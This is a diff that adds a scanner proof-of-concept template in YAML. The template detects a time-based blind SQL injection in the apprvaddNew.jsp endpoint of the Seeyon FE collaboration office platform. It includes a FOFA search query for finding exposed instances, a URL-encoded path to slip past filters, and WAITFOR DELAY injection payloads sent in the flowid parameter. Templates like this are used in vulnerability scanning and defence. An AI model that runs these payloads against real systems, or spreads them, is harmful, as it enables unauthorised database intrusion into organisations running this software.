@@ -1,0 +1,33 @@
+id: poc-yaml-seeyon-hulian-apprvaddnew-sqli
+info:
+  name: 致远互联FE协作办公平台apprvaddNew存在sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致远互联-FE
+  fofa: title="FE协作办公平台" || body="li_plugins_download"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+firstRequest:
+  method: GET
+  path: /witapprovemanage/apprvaddNew.j%73p
+  expression: 'status_code == 200
+
+    '
+requests:
+- method: POST
+  path: /witapprovemanage/apprvaddNew.j%73p
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: flowid=1';WAITFOR+DELAY+'0:0:{{.t1}}'--+---
+  expression: "status_code == 500 && \nduration >= t1 &&\nduration <= t2\n"
+- method: POST
+  path: /witapprovemanage/apprvaddNew.j%73p
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: flowid=1';WAITFOR+DELAY+'0:0:{{.t3}}'--+---
+  expression: "status_code == 500 && \nduration >= t3 &&\nduration <= t4\n"
+transport: http
